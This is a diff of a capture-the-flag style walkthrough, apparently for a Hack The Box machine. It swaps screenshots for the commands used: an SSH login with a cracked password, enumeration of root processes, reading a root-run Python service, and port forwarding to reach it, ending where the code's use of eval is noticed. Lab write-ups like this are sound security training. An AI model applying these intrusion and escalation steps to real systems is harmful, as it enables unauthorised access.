@@ -216,25 +216,53 @@ This eventually identifies the plaintext: snowflake1.
 sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=:snowflake1
 ```
 
-With this, we can now use SSH to log into the system as the Sedric user:
+With this, we can now use SSH to log into the system as the Sedric user using the password: snowflake1
 
-<img src="Images/17-Sedric-SSH.png" width="600">
+```
+ssh sedric@10.129.89.231
+```
 
-Listing the running root processes, we discover the unusual file notif.py:
+## Sedric -> Root
 
-<img src="Images/18-Processes-1.png" width="600">
+After some enumeration, we decide to list the current root processes and discover the **notif.py** program is running:
 
-[…]
+#### Listing processes
 
-<img src="Images/19-Processes-2.png" width="600">
+```
+ps aux | grep root
+```
 
-This reveals an application running locally on port 54321:
+#### Output:
 
-<img src="Images/20-Notif.png" width="600">
+```
+root           1  0.0  0.3 167548 12080 ?        Ss   06:04   0:00 /sbin/init
+root           2  0.0  0.0      0     0 ?        S    06:04   0:00 [kthreadd]
+root           3  0.0  0.0      0     0 ?        I<   06:04   0:00 [rcu_gp]
+[...]
+root        3509  0.0  0.2  40776 11444 ?        S    06:05   0:00 /usr/lib/vmware-vgauth/VGAuthService -s
+root        3536  0.0  0.7  39872 31148 ?        Ss   06:05   0:01 /usr/bin/python3 /usr/local/bin/notif.py
+root        3919  0.0  0.0      0     0 ?        I    06:29   0:00 [kworker/u4:0-events_unbound]
+
+```
+
+Reading the contents of this file, reveals an application running locally on port 54321:
+
+```
+cat /usr/local/bin/notif.py
+```
+
+#### Output:
+
+```
+if __name__=="__main__":
+    app.run("127.0.0.1",54321, threaded=True)
+```
 
 We will therefore port forward to access the application locally:
 
-<img src="Images/21-Port-Forwarding.png" width="600">
+```
+ssh sedric@10.129.89.231 -L 54321:127.0.0.1:54321
+```
 
 Looking closely at the code, we discover that the application is using eval:
 
